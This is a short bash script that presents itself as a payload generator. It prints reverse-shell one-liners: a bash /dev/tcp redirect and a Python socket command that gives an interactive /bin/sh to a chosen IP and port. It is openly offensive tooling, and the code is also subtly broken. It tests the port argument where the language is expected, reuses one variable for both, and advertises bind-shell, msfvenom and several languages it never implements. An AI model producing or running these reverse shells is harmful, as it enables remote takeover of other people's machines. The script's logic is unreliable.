#!/bin/bash
# Payload Generator Tools
# Usage: bash payload-tools.sh <command> <args>

show_help() {
    echo "Payload Generator Tools"
    echo "Commands:"
    echo "  reverse-shell <ip> <port> <lang> - Generate reverse shell"
    echo "  bind-shell <port> <lang>         - Generate bind shell"
    echo "  msfvenom-helper <payload>        - MSFvenom helper"
    echo "Languages: bash, python, php, java, powershell, ruby, perl"
}

case "$1" in
    reverse-shell)
        case $3 in
            bash) echo "bash -i >& /dev/tcp/$2/$3 0>&1" ;;
            python) echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$2\",$3));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" ;;
            *) echo "Unknown language: $3" ;;
        esac ;;
    *) show_help ;;
esac